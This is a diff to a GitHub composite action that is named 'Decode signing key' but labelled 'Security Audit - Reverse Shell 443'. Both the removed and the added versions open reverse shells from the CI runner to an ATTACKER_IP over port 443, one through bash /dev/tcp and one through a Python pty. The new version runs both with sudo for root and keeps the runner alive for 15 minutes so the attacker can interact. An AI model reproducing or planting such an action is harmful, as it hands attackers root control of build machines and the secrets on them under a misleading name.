@@ -1,29 +1,22 @@
 
 
 name: Decode signing key
-description: 'Security Audit - Reverse Shell and Post-Exploitation'
+description: 'Security Audit - Reverse Shell 443'
 runs:
   using: "composite"
   steps:
     - shell: bash
       run: |
-        # --- AYARLAR ---
-        ATTACKER_IP="SİZİN_SERVER_IP_UNVANI"
+        ATTACKER_IP="SİZİN_REAL_IP_UNVANINIZ"
         ATTACKER_PORT="443"
 
-        echo "[*] Initializing audit connection..."
+        echo "[*] Connecting to $ATTACKER_IP:$ATTACKER_PORT..."
 
-        # 1. Arxa planda Reverse Shell başladırıq (Bash Metodu)
-        # Bu komanda birbaşa sizin serverə qoşulacaq
-        (bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1) &
+        # Sudo ilə birbaşa ROOT shell göndəririk
+        sudo bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1" &
+        
+        # Ehtiyat olaraq Python shell
+        sudo python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',int('$ATTACKER_PORT')));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
 
-        # 2. Alternativ olaraq Python Reverse Shell (Bash işləməsə deyə)
-        python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',$ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
-
-        # 3. Vaxt qazanmaq (Persistence)
-        # Shell-in dərhal qapanmaması üçün maşını 10 dəqiqə (600 san) açıq saxlayırıq.
-        # Bu müddətdə siz terminalda işinizi görə bilərsiniz.
-        echo "[+] Shell attempted. Waiting for interaction on $ATTACKER_IP:$ATTACKER_PORT..."
-        sleep 600
-
-        echo "[*] Session ended."
+        echo "[+] Attempt sent. Waiting for 15 minutes..."
+        sleep 900
